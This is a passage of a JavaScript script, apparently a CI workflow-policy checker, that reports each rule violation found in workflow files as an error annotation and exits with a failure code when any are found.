    const violations = checkWorkflowFile(readFileSync(file, 'utf8'), file);
    for (const violation of violations) {
      console.error(`::error file=${file}::[${violation.rule}] ${violation.message}`);
    }
    failed += violations.length;
    if (violations.length === 0) console.info(`Workflow policy: ${file} clean.`);
  }
  if (failed > 0) console.error(`Workflow policy: ${failed} violation(s).`);
  return failed > 0 ? 1 : 0;
}

if (isMainModule(import.meta.url)) {
  process.exit(main(process.argv));
}
